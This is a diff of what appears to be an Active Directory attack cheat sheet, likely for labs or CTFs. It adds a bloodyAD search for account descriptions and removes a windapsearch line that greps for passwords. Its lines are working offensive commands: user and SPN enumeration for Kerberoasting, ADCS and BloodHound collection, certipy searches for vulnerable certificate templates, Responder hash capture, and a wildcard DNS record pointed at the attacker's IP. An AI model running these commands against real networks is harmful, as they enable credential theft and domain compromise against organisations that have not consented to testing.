@@ -184,11 +184,11 @@ impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/-
 impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass | awk '/---/{flag=1;next} flag {print $1}' | tr '[:upper:]' '[:lower:]' | tee computers
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(description=*))" --attr description
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M adcs
 nxc ldap $TARGET --dns-server $TARGET --use-kcache -M adcs
 nxc ldap $TARGET --dns-server $TARGET --use-kcache --bloodhound -c all
 certipy-ad find -dc-ip $TARGET -u '$USERNAME' -target $DC -k -vulnerable -enabled -stdout | grep -vE '\[\*\]|Error|stacktrace'
-windapsearch --dc-ip $TARGET -u $USERNAME -p $PASSWORD --full --users --computers | grep -Evi 'bad|LastSet' | grep -Ei 'passw|pwd|key|secret|desc'
 dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action query --record '@'
 sudo responder -I tun0 -v
 dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record '*'
